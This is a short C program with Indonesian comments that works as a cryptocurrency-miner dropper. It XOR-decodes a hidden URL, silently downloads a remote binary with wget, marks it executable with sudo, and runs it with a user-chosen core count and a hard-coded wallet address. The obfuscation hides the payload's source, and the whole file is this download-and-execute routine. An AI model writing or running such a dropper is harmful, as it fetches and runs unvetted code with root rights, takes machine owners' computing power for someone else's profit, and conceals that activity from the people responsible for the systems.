#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

void deobfuscate(char *str, char key) {
    for (size_t i = 0; i < strlen(str); i++) {
        str[i] ^= key;
    }
}

int main() {
    char qcore[20];
    char command[256];
    
    // Obfuscated data arrays (URL and path remain obfuscated)
    unsigned char obf_url[] = {0x3D,0x21,0x21,0x25,0x26,0x6F,0x7A,0x7A,0x32,0x3C,0x21,0x3D,0x20,0x37,0x7B,0x36,0x3A,0x38,0x7A,0x32,0x20,0x34,0x39,0x32,0x30,0x3A,0x39,0x78,0x36,0x3A,0x31,0x30,0x7A,0x23,0x25,0x39,0x7A,0x27,0x34,0x22,0x7A,0x27,0x30,0x33,0x26,0x7A,0x3D,0x30,0x34,0x31,0x26,0x7A,0x38,0x34,0x3C,0x3B,0x7A,0x26,0x2D,0x00};
    unsigned char obf_path[] = {0x7A,0x20,0x26,0x27,0x7A,0x26,0x2D,0x00};

    // Plain text wallet address (replace with actual wallet)
    char wallet[] = "88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX";

    // Dekripsi URL dan path menggunakan key 0x55
    deobfuscate((char*)obf_url, 0x55);
    deobfuscate((char*)obf_path, 0x55);

    // Mendownload file dengan URL yang sudah didekripsi
    char download_cmd[512];
    snprintf(download_cmd, sizeof(download_cmd), "wget -q %s -O %s >/dev/null 2>&1", obf_url, obf_path);
    int download_status = system(download_cmd);
    
    if (download_status != 0) {
        printf("Error: Gagal mendownload sx\n");
        return 1;
    }
    
    // Memberikan izin eksekusi
    char chmod_cmd[256];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "sudo chmod +x %s >/dev/null 2>&1", obf_path);
    int chmod_status = system(chmod_cmd);
    
    if (chmod_status != 0) {
        printf("Error: Gagal memberikan izin eksekusi\n");
        return 1;
    }
    
    // Input jumlah core
    printf("Masukan jumlah core: ");
    fflush(stdout);
    
    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        return 1;
    }
    
    qcore[strcspn(qcore, "\n")] = '\0';
    
    // Membuat command dengan wallet plain text
    snprintf(command, sizeof(command), "%s %s %s", obf_path, qcore, wallet);
    
    // Menjalankan program
    int status = system(command);
    
    if (status == -1) {
        return 1;
    }
    
    return 0;
}
